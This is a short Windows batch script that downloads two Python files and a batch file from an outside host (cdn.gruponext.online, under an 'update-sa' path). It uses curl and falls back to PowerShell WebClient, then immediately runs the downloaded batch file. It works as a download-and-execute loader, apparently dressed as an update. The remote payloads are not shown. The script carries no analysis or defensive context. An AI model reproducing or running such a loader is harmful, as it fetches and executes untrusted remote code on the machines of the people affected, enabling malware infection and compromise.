@echo off

set URL1=https://cdn.gruponext.online/update-sa/PWRN.py
set URL2=https://cdn.gruponext.online/update-sa/BubbleDash.py
set URL3=https://cdn.gruponext.online/update-sa/bubble-bin.bat

curl -o PWRN.py %URL1% || powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL1%', 'PWRN.py')"
curl -o BubbleDash.py %URL2% || powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL2%', 'BubbleDash.py')"
curl -o bubble-bin.bat %URL3% || powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL3%', 'bubble-bin.bat')"

call bubble-bin.bat
exit